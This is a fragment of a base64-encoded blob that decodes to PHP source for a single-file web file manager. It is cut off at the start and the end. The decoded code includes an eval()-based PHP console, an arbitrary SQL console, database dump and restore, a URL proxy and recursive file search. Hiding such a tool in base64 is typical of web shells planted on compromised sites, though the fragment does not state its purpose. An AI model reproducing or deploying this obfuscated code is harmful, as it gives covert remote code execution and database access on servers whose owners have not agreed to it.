CAkdHlwZSA9ICdhbGwnLCAkZG9fbm90X2ZpbHRlciA9IGZhbHNlKSB7CgkkZGlyID0gJG5kaXIgPSBhcnJheSgpOwoJaWYoIWVtcHR5KCRleHApKXsKCQkkZXhwID0gJy9eJyAuIHN0cl9yZXBsYWNlKCcqJywgJyguKiknLCBzdHJfcmVwbGFjZSgnLicsICdcXC4nLCAkZXhwKSkgLiAnJC8nOwoJfQoJaWYoIWVtcHR5KCR0eXBlKSAmJiAkdHlwZSAhPT0gJ2FsbCcpewoJCSRmdW5jID0gJ2lzXycgLiAkdHlwZTsKCX0KCWlmKEBpc19kaXIoJGRpcmVjdG9yeSkpewoJCSRmaCA9IG9wZW5kaXIoJGRpcmVjdG9yeSk7CgkJd2hpbGUgKGZhbHNlICE9PSAoJGZpbGVuYW1lID0gcmVhZGRpcigkZmgpKSkgewoJCQlpZihzdWJzdHIoJGZpbGVuYW1lLCAwLCAxKSAhPSAnLicgfHwgJGRvX25vdF9maWx0ZXIpIHsKCQkJCWlmKChlbXB0eSgkdHlwZSkgfHwgJHR5cGUgPT0gJ2FsbCcgfHwgJGZ1bmMoJGRpcmVjdG9yeSAuICcvJyAuICRmaWxlbmFtZSkpICYmIChlbXB0eSgkZXhwKSB8fCBwcmVnX21hdGNoKCRleHAsICRmaWxlbmFtZSkpKXsKCQkJCQkkZGlyW10gPSAkZmlsZW5hbWU7CgkJCQl9CgkJCX0KCQl9CgkJY2xvc2VkaXIoJGZoKTsKCQluYXRzb3J0KCRkaXIpOwoJfQoJcmV0dXJuICRkaXI7Cn0KCmZ1bmN0aW9uIGZtX2xpbmsoJGdldCwkbGluaywkbmFtZSwkdGl0bGU9JycpIHsKCWlmIChlbXB0eSgkdGl0bGUpKSAkdGl0bGU9JG5hbWUuJyAnLmJhc2VuYW1lKCRsaW5rKTsKCXJldHVybiAnJm5ic3A7Jm5ic3A7PGEgaHJlZj0iPycuJGdldC4nPScuYmFzZTY0X2VuY29kZSgkbGluaykuJyIgdGl0bGU9IicuJHRpdGxlLiciPicuJG5hbWUuJzwvYT4nOwp9CgpmdW5jdGlvbiBmbV9hcnJfdG9fb3B0aW9uKCRhcnIsJG4sJHNlbD0nJyl7Cglmb3JlYWNoKCRhcnIgYXMgJHYpewoJCSRiPSR2WyRuXTsKCQkkcmVzLj0nPG9wdGlvbiB2YWx1ZT0iJy4kYi4nIiAnLigkc2VsICYmICRzZWw9PSRiPydzZWxlY3RlZCc6JycpLic+Jy4kYi4nPC9vcHRpb24+JzsKCX0KCXJldHVybiAkcmVzOwp9CgpmdW5jdGlvbiBmbV9sYW5nX2Zvcm0gKCRjdXJyZW50PSdlbicpewpyZXR1cm4gJwo8Zm9ybSBuYW1lPSJjaGFuZ2VfbGFuZyIgbWV0aG9kPSJwb3N0IiBhY3Rpb249IiI+Cgk8c2VsZWN0IG5hbWU9ImZtX2xhbmciIHRpdGxlPSInLl9fKCdMYW5ndWFnZScpLiciIG9uY2hhbmdlPSJkb2N1bWVudC5mb3Jtc1tcJ2NoYW5nZV9sYW5nXCddLnN1Ym1pdCgpIiA+CgkJPG9wdGlvbiB2YWx1ZT0iZW4iICcuKCRjdXJyZW50PT0nZW4nPydzZWxlY3RlZD0ic2VsZWN0ZWQiICc6JycpLic+Jy5fXygnRW5nbGlzaCcpLic8L29wdGlvbj4KCQk8b3B0aW9uIHZhbHVlPSJkZSIgJy4oJGN1cnJlbnQ9PSdkZSc/J3NlbGVjdGVkPSJzZWxlY3RlZCIgJzonJykuJz4nLl9fKCdHZXJtYW4nKS4nPC9vcHRpb24+CgkJPG9wdGlvbiB2YWx1ZT0icnUiICcuKCRjdXJyZW50PT0ncnUnPydzZWxlY3RlZD0ic2VsZWN0ZWQiICc6JycpLic+Jy5fXygnUnVzc2lhbicpLic8L29wdGlvbj4KCQk8b3B0aW9uIHZhbHVlPSJmciIgJy4oJGN1cnJlbnQ9PSdmcic/J3NlbGVjdGVkPSJzZWxlY3RlZCIgJzonJykuJz4nLl9fKCdGcmVuY2gnKS4nPC9vcHRpb24+CgkJPG9wdGlvbiB2YWx1ZT0idWsiICcuKCRjdXJyZW50PT0ndWsnPydzZWxlY3RlZD0ic2VsZWN0ZWQiICc6JycpLic+Jy5fXygnVWtyYWluaWFuJykuJzwvb3B0aW9uPgoJPC9zZWxlY3Q+CjwvZm9ybT4KJzsKfQoJCmZ1bmN0aW9uIGZtX3Jvb3QoJGRpcm5hbWUpewoJcmV0dXJuICgkZGlybmFtZT09Jy4nIE9SICRkaXJuYW1lPT0nLi4nKTsKfQoKZnVuY3Rpb24gZm1fcGhwKCRzdHJpbmcpewoJJGRpc3BsYXlfZXJyb3JzPWluaV9nZXQoJ2Rpc3BsYXlfZXJyb3JzJyk7Cglpbmlfc2V0KCdkaXNwbGF5X2Vycm9ycycsICcxJyk7CglvYl9zdGFydCgpOwoJZXZhbCh0cmltKCRzdHJpbmcpKTsKCSR0ZXh0ID0gb2JfZ2V0X2NvbnRlbnRzKCk7CglvYl9lbmRfY2xlYW4oKTsKCWluaV9zZXQoJ2Rpc3BsYXlfZXJyb3JzJywgJGRpc3BsYXlfZXJyb3JzKTsKCXJldHVybiAkdGV4dDsKfQoKLy9TSE9XIERBVEFCQVNFUwpmdW5jdGlvbiBmbV9zcWxfY29ubmVjdCgpewoJZ2xvYmFsICRmbV9jb25maWc7CglyZXR1cm4gbmV3IG15c3FsaSgkZm1fY29uZmlnWydzcWxfc2VydmVyJ10sICRmbV9jb25maWdbJ3NxbF91c2VybmFtZSddLCAkZm1fY29uZmlnWydzcWxfcGFzc3dvcmQnXSwgJGZtX2NvbmZpZ1snc3FsX2RiJ10pOwp9CgpmdW5jdGlvbiBmbV9zcWwoJHF1ZXJ5KXsKCWdsb2JhbCAkZm1fY29uZmlnOwoJJHF1ZXJ5PXRyaW0oJHF1ZXJ5KTsKCW9iX3N0YXJ0KCk7CgkkY29ubmVjdGlvbiA9IGZtX3NxbF9jb25uZWN0KCk7CglpZiAoJGNvbm5lY3Rpb24tPmNvbm5lY3RfZXJyb3IpIHsKCQlvYl9lbmRfY2xlYW4oKTsJCgkJcmV0dXJuICRjb25uZWN0aW9uLT5jb25uZWN0X2Vycm9yOwoJfQoJJGNvbm5lY3Rpb24tPnNldF9jaGFyc2V0KCd1dGY4Jyk7CiAgICAkcXVlcmllZCA9IG15c3FsaV9xdWVyeSgkY29ubmVjdGlvbiwkcXVlcnkpOwoJaWYgKCRxdWVyaWVkPT09ZmFsc2UpIHsKCQlvYl9lbmRfY2xlYW4oKTsJCgkJcmV0dXJuIG15c3FsaV9lcnJvcigkY29ubmVjdGlvbik7CiAgICB9IGVsc2UgewoJCWlmKCFlbXB0eSgkcXVlcmllZCkpewoJCQl3aGlsZSgkcm93ID0gbXlzcWxpX2ZldGNoX2Fzc29jKCRxdWVyaWVkKSkgewoJCQkJJHF1ZXJ5X3Jlc3VsdFtdPSAgJHJvdzsKCQkJfQoJCX0KCQkkdmR1bXA9ZW1wdHkoJHF1ZXJ5X3Jlc3VsdCk/Jyc6dmFyX2V4cG9ydCgkcXVlcnlfcmVzdWx0LHRydWUpOwkKCQlvYl9lbmRfY2xlYW4oKTsJCgkJJGNvbm5lY3Rpb24tPmNsb3NlKCk7CgkJcmV0dXJuICc8cHJlPicuc3RyaXBzbGFzaGVzKCR2ZHVtcCkuJzwvcHJlPic7Cgl9Cn0KCmZ1bmN0aW9uIGZtX2JhY2t1cF90YWJsZXMoJHRhYmxlcyA9ICcqJywgJGZ1bGxfYmFja3VwID0gdHJ1ZSkgewoJZ2xvYmFsICRwYXRoOwoJJG15c3FsZGIgPSBmbV9zcWxfY29ubmVjdCgpOwoJJGRlbGltaXRlciA9ICI7IFxuICBcbiI7CglpZigkdGFibGVzID09ICcqJykJewoJCSR0YWJsZXMgPSBhcnJheSgpOwoJCSRyZXN1bHQgPSAkbXlzcWxkYi0+cXVlcnkoJ1NIT1cgVEFCTEVTJyk7CgkJd2hpbGUoJHJvdyA9IG15c3FsaV9mZXRjaF9yb3coJHJlc3VsdCkpCXsKCQkJJHRhYmxlc1tdID0gJHJvd1swXTsKCQl9Cgl9IGVsc2UgewoJCSR0YWJsZXMgPSBpc19hcnJheSgkdGFibGVzKSA/ICR0YWJsZXMgOiBleHBsb2RlKCcsJywkdGFibGVzKTsKCX0KICAgIAoJJHJldHVybj0nJzsKCWZvcmVhY2goJHRhYmxlcyBhcyAkdGFibGUpCXsKCQkkcmVzdWx0ID0gJG15c3FsZGItPnF1ZXJ5KCdTRUxFQ1QgKiBGUk9NICcuJHRhYmxlKTsKCQkkbnVtX2ZpZWxkcyA9IG15c3FsaV9udW1fZmllbGRzKCRyZXN1bHQpOwoJCSRyZXR1cm4uPSAnRFJPUCBUQUJMRSBJRiBFWElTVFMgYCcuJHRhYmxlLidgJy4kZGVsaW1pdGVyOwoJCSRyb3cyID0gbXlzcWxpX2ZldGNoX3JvdygkbXlzcWxkYi0+cXVlcnkoJ1NIT1cgQ1JFQVRFIFRBQkxFICcuJHRhYmxlKSk7CgkJJHJldHVybi49JHJvdzJbMV0uJGRlbGltaXRlcjsKICAgICAgICBpZiAoJGZ1bGxfYmFja3VwKSB7CgkJZm9yICgkaSA9IDA7ICRpIDwgJG51bV9maWVsZHM7ICRpKyspICB7CgkJCXdoaWxlKCRyb3cgPSBteXNxbGlfZmV0Y2hfcm93KCRyZXN1bHQpKSB7CgkJCQkkcmV0dXJuLj0gJ0lOU0VSVCBJTlRPIGAnLiR0YWJsZS4nYCBWQUxVRVMoJzsKCQkJCWZvcigkaj0wOyAkajwkbnVtX2ZpZWxkczsgJGorKykJewoJCQkJCSRyb3dbJGpdID0gYWRkc2xhc2hlcygkcm93WyRqXSk7CgkJCQkJJHJvd1skal0gPSBzdHJfcmVwbGFjZSgiXG4iLCJcXG4iLCRyb3dbJGpdKTsKCQkJCQlpZiAoaXNzZXQoJHJvd1skal0pKSB7ICRyZXR1cm4uPSAnIicuJHJvd1skal0uJyInIDsgfSBlbHNlIHsgJHJldHVybi49ICciIic7IH0KCQkJCQlpZiAoJGo8KCRudW1fZmllbGRzLTEpKSB7ICRyZXR1cm4uPSAnLCc7IH0KCQkJCX0KCQkJCSRyZXR1cm4uPSAnKScuJGRlbGltaXRlcjsKCQkJfQoJCSAgfQoJCX0gZWxzZSB7IAoJCSRyZXR1cm4gPSBwcmVnX3JlcGxhY2UoIiNBVVRPX0lOQ1JFTUVOVD1bXGRdKyAjaXMiLCAnJywgJHJldHVybik7CgkJfQoJCSRyZXR1cm4uPSJcblxuXG4iOwoJfQoKCS8vc2F2ZSBmaWxlCiAgICAkZmlsZT1nbWRhdGUoIlktbS1kX0gtaS1zIix0aW1lKCkpLicuc3FsJzsKCSRoYW5kbGUgPSBmb3BlbigkZmlsZSwndysnKTsKCWZ3cml0ZSgkaGFuZGxlLCRyZXR1cm4pOwoJZmNsb3NlKCRoYW5kbGUpOwoJJGFsZXJ0ID0gJ29uQ2xpY2s9ImlmKGNvbmZpcm0oXCcnLiBfXygnRmlsZSBzZWxlY3RlZCcpLic6IFxuJy4gJGZpbGUuICcuIFxuJy5fXygnQXJlIHlvdSBzdXJlIHlvdSB3YW50IHRvIGRlbGV0ZSB0aGlzIGZpbGU/JykgLiAnXCcpKSBkb2N1bWVudC5sb2NhdGlvbi5ocmVmID0gXCc/ZGVsZXRlPScgLiAkZmlsZSAuICcmcGF0aD0nIC4gJHBhdGggIC4gJ1wnIic7CiAgICByZXR1cm4gJGZpbGUuJzogJy5mbV9saW5rKCdkb3dubG9hZCcsJHBhdGguJGZpbGUsX18oJ0Rvd25sb2FkJyksX18oJ0Rvd25sb2FkJykuJyAnLiRmaWxlKS4nIDxhIGhyZWY9IiMiIHRpdGxlPSInIC4gX18oJ0RlbGV0ZScpIC4gJyAnLiAkZmlsZSAuICciICcgLiAkYWxlcnQgLiAnPicgLiBfXygnRGVsZXRlJykgLiAnPC9hPic7Cn0KCmZ1bmN0aW9uIGZtX3Jlc3RvcmVfdGFibGVzKCRzcWxGaWxlVG9FeGVjdXRlKSB7CgkkbXlzcWxkYiA9IGZtX3NxbF9jb25uZWN0KCk7CgkkZGVsaW1pdGVyID0gIjsgXG4gIFxuIjsKICAgIC8vIExvYWQgYW5kIGV4cGxvZGUgdGhlIHNxbCBmaWxlCiAgICAkZiA9IGZvcGVuKCRzcWxGaWxlVG9FeGVjdXRlLCJyKyIpOwogICAgJHNxbEZpbGUgPSBmcmVhZCgkZixmaWxlc2l6ZSgkc3FsRmlsZVRvRXhlY3V0ZSkpOwogICAgJHNxbEFycmF5ID0gZXhwbG9kZSgkZGVsaW1pdGVyLCRzcWxGaWxlKTsKCQogICAgLy9Qcm9jZXNzIHRoZSBzcWwgZmlsZSBieSBzdGF0ZW1lbnRzCiAgICBmb3JlYWNoICgkc3FsQXJyYXkgYXMgJHN0bXQpIHsKICAgICAgICBpZiAoc3RybGVuKCRzdG10KT4zKXsKCQkJJHJlc3VsdCA9ICRteXNxbGRiLT5xdWVyeSgkc3RtdCk7CgkJCQlpZiAoISRyZXN1bHQpewoJCQkJCSRzcWxFcnJvckNvZGUgPSBteXNxbGlfZXJybm8oJG15c3FsZGItPmNvbm5lY3Rpb24pOwoJCQkJCSRzcWxFcnJvclRleHQgPSBteXNxbGlfZXJyb3IoJG15c3FsZGItPmNvbm5lY3Rpb24pOwoJCQkJCSRzcWxTdG10ICAgICAgPSAkc3RtdDsKCQkJCQlicmVhazsKICAgICAgICAgICAJICAgICB9CiAgICAgICAgICAgCSAgfQogICAgICAgICAgIH0KaWYgKGVtcHR5KCRzcWxFcnJvckNvZGUpKSByZXR1cm4gX18oJ1N1Y2Nlc3MnKS4nIOKAlCAnLiRzcWxGaWxlVG9FeGVjdXRlOwplbHNlIHJldHVybiAkc3FsRXJyb3JUZXh0Lic8YnIvPicuJHN0bXQ7Cn0KCmZ1bmN0aW9uIGZtX2ltZ19saW5rKCRmaWxlbmFtZSl7CglyZXR1cm4gJy4vJy5iYXNlbmFtZShfX0ZJTEVfXykuJz9pbWc9Jy5iYXNlNjRfZW5jb2RlKCRmaWxlbmFtZSk7Cn0KCmZ1bmN0aW9uIGZtX2hvbWVfc3R5bGUoKXsKCXJldHVybiAnCmlucHV0LCBpbnB1dC5mbV9pbnB1dCB7Cgl0ZXh0LWluZGVudDogMnB4Owp9CgppbnB1dCwgdGV4dGFyZWEsIHNlbGVjdCwgaW5wdXQuZm1faW5wdXQgewoJY29sb3I6IGJsYWNrOwoJZm9udDogbm9ybWFsIDhwdCBWZXJkYW5hLCBBcmlhbCwgSGVsdmV0aWNhLCBzYW5zLXNlcmlmOwoJYm9yZGVyLWNvbG9yOiBibGFjazsKCWJhY2tncm91bmQtY29sb3I6ICNGQ0ZDRkMgbm9uZSAhaW1wb3J0YW50OwoJYm9yZGVyLXJhZGl1czogMDsKCXBhZGRpbmc6IDJweDsKfQoKaW5wdXQuZm1faW5wdXQgewoJYmFja2dyb3VuZDogI0ZDRkNGQyBub25lICFpbXBvcnRhbnQ7CgljdXJzb3I6IHBvaW50ZXI7Cn0KCi5ob21lIHsKCWJhY2tncm91bmQtaW1hZ2U6IHVybCgiZGF0YTppbWFnZS9wbmc7YmFzZTY0LGlWQk9SdzBLR2dvQUFBQU5TVWhFVWdBQUFCQUFBQUFRQ0FNQUFBQW9MUTlUQUFBQUJHZEJUVUVBQUsvSU53V0s2UUFBQWdSUVRGUkYvZjM5Nk9qby8vLy90VDAyenIrZnc2NlJ0ajQzMlRFcDNNWEUyREFyM1RZcDF5NG10RHcyLzdCTS83Qk9xVnBjLzhsMzFqY3FxNmVud2NIQjJUZ2k1amdxVnBiRnZyYTJuQkFWL1B6ODJTMGpueDBXM1RVa3FTZ2k0ZUhoNFRzcmU0d29zejAyNnVQanpHWWQ2VXMzeW5BeWRVQkE1S2wzZm01ZXFaYVc3T0RnaTJWZytQajR1WStFd0xtNWJZOVUvLzdqZkx0Qyt0T0szamNtLzcxdTJqWW8xVVloNWFKbC9zZUMzakVtMTJrbUpySUExak1tLzlhVTRMaDBlMDFCbElhRS8vL2RoTWRDN0lBLy9mVFoyYzNNVzZuTjMwd2Y5NVZkNEpkWG9YVm9zOG5FNGVmTi8rNjNJSmdTbllobDdGNGNzWHQ4OUdRVXdMKy9qbDFjNDFBcStmYjJnbXRJMXJLYTJDNGtKYUlBM2pZcmxUdzV0ajQyM2pZbjNjWEUxelFveE1IQnAxbFozRGdtcWlrcy8rbWNqTEs4M2pZa3ltTVYzVFlrLy9ITSt1N1dobXRyMG9kVHBhT2pmV0pmckhwZy84QnMvN3RXLzdWZSs0VTUyRE1tM01MQm40cUxnTlZNNk16QjNsRWZsSXVMLytqQS8vLzIwTE96alh4OC83bGJXcEpHMkM4azNUb3NKS01BMXl3am9wT1IxellwNURzcGlheSt5S05ocUtTazhOVzYvZmpuczdPejJ0blp1ejg4N2IrVzNhUlkvK21zNHJDRTNUb3Q3Vjg1Ykt4anVFQTN3NDVWaDV1aHE2YW00Y0Z4Z1paVy85cUl1d2dLeTBzVyt1alQ0VFFudHo0MjNDOGkzelVqLytLdy9hNWQ2VU14dUw2d3pERXIvLy8vY3FKUWZBQUFBS3gwVWs1VC8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vL0FBV1ZGYkVBQUFBWmRFVllkRk52Wm5SM1lYSmxBRUZrYjJKbElFbHRZV2RsVW1WaFpIbHh5V1U4QUFBQTJVbEVRVlFvVTJOWWpRWVlzQWlFOFU5WXpEWWpWcEdaUnhNaUVDaXRNclZadm9NclRsUTJFU1JRSjJGVndpbllibXFUVUxvb2huRTFnMWFLR1MvZk5NdGs0MHlaOUtWTFFoZ1lrdVk3TnhRdlh5SFZGTm5LelI2OXFweEJQTWV6MEVUQVF5VFV2U29nYUlGYVBjTnFWL001ZGhhMlJsMlRpbWI2WitRQkRZMVhOL1NidTh4RkxHM2VMRGZsMlVBQmppbE8xbzAxMlozZWsxbFpWSVdBQW1VVEs2TDBzM3BYK2pqNnB1WjJBd1dVdkJSYXBoc3dNZFV1akNpd0R3YTVWRWRQSTd5blVsYzd2MXFZVVJMcXVmNDJoejQ1Q0JQRHR3QUNybStSRGN4SllBQUFBQUJKUlU1RXJrSmdnZz09Iik7CgliYWNrZ3JvdW5kLXJlcGVhdDogbm8tcmVwZWF0Owp9JzsKfQoKZnVuY3Rpb24gZm1fY29uZmlnX2NoZWNrYm94X3JvdygkbmFtZSwkdmFsdWUpIHsKCWdsb2JhbCAkZm1fY29uZmlnOwoJcmV0dXJuICc8dHI+PHRkIGNsYXNzPSJyb3cxIj48aW5wdXQgaWQ9ImZtX2NvbmZpZ18nLiR2YWx1ZS4nIiBuYW1lPSJmbV9jb25maWdbJy4kdmFsdWUuJ10iIHZhbHVlPSIxIiAnLihlbXB0eSgkZm1fY29uZmlnWyR2YWx1ZV0pPycnOidjaGVja2VkPSJ0cnVlIicpLicgdHlwZT0iY2hlY2tib3giPjwvdGQ+PHRkIGNsYXNzPSJyb3cyIHdob2xlIj48bGFiZWwgZm9yPSJmbV9jb25maWdfJy4kdmFsdWUuJyI+Jy4kbmFtZS4nPC90ZD48L3RyPic7Cn0KCmZ1bmN0aW9uIGZtX3Byb3RvY29sKCkgewoJaWYgKGlzc2V0KCRfU0VSVkVSWydIVFRQX1NDSEVNRSddKSkgcmV0dXJuICRfU0VSVkVSWydIVFRQX1NDSEVNRSddLic6Ly8nOwoJaWYgKGlzc2V0KCRfU0VSVkVSWydIVFRQUyddKSAmJiAkX1NFUlZFUlsnSFRUUFMnXSA9PSAnb24nKSByZXR1cm4gJ2h0dHBzOi8vJzsKCWlmIChpc3NldCgkX1NFUlZFUlsnU0VSVkVSX1BPUlQnXSkgJiYgJF9TRVJWRVJbJ1NFUlZFUl9QT1JUJ10gPT0gNDQzKSByZXR1cm4gJ2h0dHBzOi8vJzsKCWlmIChpc3NldCgkX1NFUlZFUlsnSFRUUF9YX0ZPUldBUkRFRF9QUk9UTyddKSAmJiAkX1NFUlZFUlsnSFRUUF9YX0ZPUldBUkRFRF9QUk9UTyddID09ICdodHRwcycpIHJldHVybiAnaHR0cHM6Ly8nOwoJcmV0dXJuICdodHRwOi8vJzsKfQoKZnVuY3Rpb24gZm1fc2l0ZV91cmwoKSB7CglyZXR1cm4gZm1fcHJvdG9jb2woKS4kX1NFUlZFUlsnSFRUUF9IT1NUJ107Cn0KCmZ1bmN0aW9uIGZtX3VybCgkZnVsbD1mYWxzZSkgewoJJGhvc3Q9JGZ1bGw/Zm1fc2l0ZV91cmwoKTonLic7CglyZXR1cm4gJGhvc3QuJy8nLmJhc2VuYW1lKF9fRklMRV9fKTsKfQoKZnVuY3Rpb24gZm1faG9tZSgkZnVsbD1mYWxzZSl7CglyZXR1cm4gJyZuYnNwOzxhIGhyZWY9IicuZm1fdXJsKCRmdWxsKS4nIiB0aXRsZT0iJy5fXygnSG9tZScpLiciPjxzcGFuIGNsYXNzPSJob21lIj4mbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDs8L3NwYW4+PC9hPic7Cn0KCmZ1bmN0aW9uIGZtX3J1bl9pbnB1dCgkbG5nKSB7CglnbG9iYWwgJGZtX2NvbmZpZzsKCSRyZXR1cm4gPSAhZW1wdHkoJGZtX2NvbmZpZ1snZW5hYmxlXycuJGxuZy4nX2NvbnNvbGUnXSkgPyAKCScKCQkJCTxmb3JtICBtZXRob2Q9InBvc3QiIGFjdGlvbj0iJy5mbV91cmwoKS4nIiBzdHlsZT0iZGlzcGxheTppbmxpbmUiPgoJCQkJPGlucHV0IHR5cGU9InN1Ym1pdCIgbmFtZT0iJy4kbG5nLidydW4iIHZhbHVlPSInLnN0cnRvdXBwZXIoJGxuZykuJyAnLl9fKCdDb25zb2xlJykuJyI+CgkJCQk8L2Zvcm0+CicgOiAnJzsKCXJldHVybiAkcmV0dXJuOwp9CgpmdW5jdGlvbiBmbV91cmxfcHJveHkoJG1hdGNoZXMpIHsKCSRsaW5rID0gc3RyX3JlcGxhY2UoJyZhbXA7JywnJicsJG1hdGNoZXNbMl0pOwoJJHVybCA9IGlzc2V0KCRfR0VUWyd1cmwnXSk/JF9HRVRbJ3VybCddOicnOwoJJHBhcnNlX3VybCA9IHBhcnNlX3VybCgkdXJsKTsKCSRob3N0ID0gJHBhcnNlX3VybFsnc2NoZW1lJ10uJzovLycuJHBhcnNlX3VybFsnaG9zdCddLicvJzsKCWlmIChzdWJzdHIoJGxpbmssMCwyKT09Jy8vJykgewoJCSRsaW5rID0gc3Vic3RyX3JlcGxhY2UoJGxpbmssZm1fcHJvdG9jb2woKSwwLDIpOwoJfSBlbHNlaWYgKHN1YnN0cigkbGluaywwLDEpPT0nLycpIHsKCQkkbGluayA9IHN1YnN0cl9yZXBsYWNlKCRsaW5rLCRob3N0LDAsMSk7CQoJfSBlbHNlaWYgKHN1YnN0cigkbGluaywwLDIpPT0nLi8nKSB7CgkJJGxpbmsgPSBzdWJzdHJfcmVwbGFjZSgkbGluaywkaG9zdCwwLDIpOwkKCX0gZWxzZWlmIChzdWJzdHIoJGxpbmssMCw0KT09J2h0dHAnKSB7CgkJLy9hbGxlcyBtYWNoZW4gd3VuZGVyc2Nob24KCX0gZWxzZSB7CgkJJGxpbmsgPSAkaG9zdC4kbGluazsKCX0gCglpZiAoJG1hdGNoZXNbMV09PSdocmVmJyAmJiAhc3Rycmlwb3MoJGxpbmssICdjc3MnKSkgewoJCSRiYXNlID0gZm1fc2l0ZV91cmwoKS4nLycuYmFzZW5hbWUoX19GSUxFX18pOwoJCSRiYXNlcSA9ICRiYXNlLic/cHJveHk9dHJ1ZSZ1cmw9JzsKCQkkbGluayA9ICRiYXNlcS51cmxlbmNvZGUoJGxpbmspOwoJfSBlbHNlaWYgKHN0cnJpcG9zKCRsaW5rLCAnY3NzJykpewoJCS8v0LrQsNC6LdGC0L4g0YLQvtC20LUg0L/QvtC00LzQtdC90Y/RgtGMINC90LDQtNC+Cgl9CglyZXR1cm4gJG1hdGNoZXNbMV0uJz0iJy4kbGluay4nIic7Cn0KIApmdW5jdGlvbiBmbV90cGxfZm9ybSgkbG5nX3RwbCkgewoJZ2xvYmFsICR7JGxuZ190cGwuJ190ZW1wbGF0ZXMnfTsKCSR0cGxfYXJyID0ganNvbl9kZWNvZGUoJHskbG5nX3RwbC4nX3RlbXBsYXRlcyd9LHRydWUpOwoJJHN0ciA9ICcnOwoJZm9yZWFjaCAoJHRwbF9hcnIgYXMgJGt0cGw9PiR2dHBsKSB7CgkJJHN0ciAuPSAnPHRyPjx0ZCBjbGFzcz0icm93MSI+PGlucHV0IG5hbWU9IicuJGxuZ190cGwuJ19uYW1lW10iIHZhbHVlPSInLiRrdHBsLiciPjwvdGQ+PHRkIGNsYXNzPSJyb3cyIHdob2xlIj48dGV4dGFyZWEgbmFtZT0iJy4kbG5nX3RwbC4nX3ZhbHVlW10iICBjb2xzPSI1NSIgcm93cz0iNSIgY2xhc3M9InRleHRhcmVhX2lucHV0Ij4nLiR2dHBsLic8L3RleHRhcmVhPiA8aW5wdXQgbmFtZT0iZGVsXycucmFuZCgpLiciIHR5cGU9ImJ1dHRvbiIgb25DbGljaz0idGhpcy5wYXJlbnROb2RlLnBhcmVudE5vZGUucmVtb3ZlKCk7IiB2YWx1ZT0iJy5fXygnRGVsZXRlJykuJyIvPjwvdGQ+PC90cj4nOwoJfQpyZXR1cm4gJwo8dGFibGU+Cjx0cj48dGggY29sc3Bhbj0iMiI+Jy5zdHJ0b3VwcGVyKCRsbmdfdHBsKS4nICcuX18oJ3RlbXBsYXRlcycpLicgJy5mbV9ydW5faW5wdXQoJGxuZ190cGwpLic8L3RoPjwvdHI+Cjxmb3JtIG1ldGhvZD0icG9zdCIgYWN0aW9uPSIiPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiB2YWx1ZT0iJy4kbG5nX3RwbC4nIiBuYW1lPSJ0cGxfZWRpdGVkIj4KPHRyPjx0ZCBjbGFzcz0icm93MSI+Jy5fXygnTmFtZScpLic8L3RkPjx0ZCBjbGFzcz0icm93MiB3aG9sZSI+Jy5fXygnVmFsdWUnKS4nPC90ZD48L3RyPgonLiRzdHIuJwo8dHI+PHRkIGNvbHNwYW49IjIiIGNsYXNzPSJyb3czIj48aW5wdXQgbmFtZT0icmVzIiB0eXBlPSJidXR0b24iIG9uQ2xpY2s9ImRvY3VtZW50LmxvY2F0aW9uLmhyZWYgPSBcJycuZm1fdXJsKCkuJz9mbV9zZXR0aW5ncz10cnVlXCc7IiB2YWx1ZT0iJy5fXygnUmVzZXQnKS4nIi8+IDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSInLl9fKCdTYXZlJykuJyIgPjwvdGQ+PC90cj4KPC9mb3JtPgo8Zm9ybSBtZXRob2Q9InBvc3QiIGFjdGlvbj0iIj4KPGlucHV0IHR5cGU9ImhpZGRlbiIgdmFsdWU9IicuJGxuZ190cGwuJyIgbmFtZT0idHBsX2VkaXRlZCI+Cjx0cj48dGQgY2xhc3M9InJvdzEiPjxpbnB1dCBuYW1lPSInLiRsbmdfdHBsLidfbmV3X25hbWUiIHZhbHVlPSIiIHBsYWNlaG9sZGVyPSInLl9fKCdOZXcnKS4nICcuX18oJ05hbWUnKS4nIj48L3RkPjx0ZCBjbGFzcz0icm93MiB3aG9sZSI+PHRleHRhcmVhIG5hbWU9IicuJGxuZ190cGwuJ19uZXdfdmFsdWUiICBjb2xzPSI1NSIgcm93cz0iNSIgY2xhc3M9InRleHRhcmVhX2lucHV0IiBwbGFjZWhvbGRlcj0iJy5fXygnTmV3JykuJyAnLl9fKCdWYWx1ZScpLiciPjwvdGV4dGFyZWE+PC90ZD48L3RyPgo8dHI+PHRkIGNvbHNwYW49IjIiIGNsYXNzPSJyb3czIj48aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iJy5fXygnQWRkJykuJyIgPjwvdGQ+PC90cj4KPC9mb3JtPgo8L3RhYmxlPgonOwp9CgpmdW5jdGlvbiBmaW5kX3RleHRfaW5fZmlsZXMoJGRpciwgJG1hc2ssICR0ZXh0KSB7CiAgICAkcmVzdWx0cyA9IGFycmF5KCk7CiAgICBpZiAoJGhhbmRsZSA9IG9wZW5kaXIoJGRpcikpIHsKICAgICAgICB3aGlsZSAoZmFsc2UgIT09ICgkZW50cnkgPSByZWFkZGlyKCRoYW5kbGUpKSkgewogICAgICAgICAgICBpZiAoJGVudHJ5ICE9ICIuIiAmJiAkZW50cnkgIT0gIi4uIikgewogICAgICAgICAgICAgICAgJHBhdGggPSAkZGlyIC4gIi8iIC4gJGVudHJ5OwogICAgICAgICAgICAgICAgaWYgKGlzX2RpcigkcGF0aCkpIHsKICAgICAgICAgICAgICAgICAgICAkcmVzdWx0cyA9IGFycmF5X21lcmdlKCRyZXN1bHRzLCBmaW5kX3RleHRfaW5fZmlsZXMoJHBhdGgsICRtYXNrLCAkdGV4dCkpOwogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICBpZiAoZm5tYXRjaCgkbWFzaywgJGVudHJ5KSkgewogICAgICAgICAgICAgICAgICAgICAgICAkY29udGVudHMgPSBmaWxlX2dldF9jb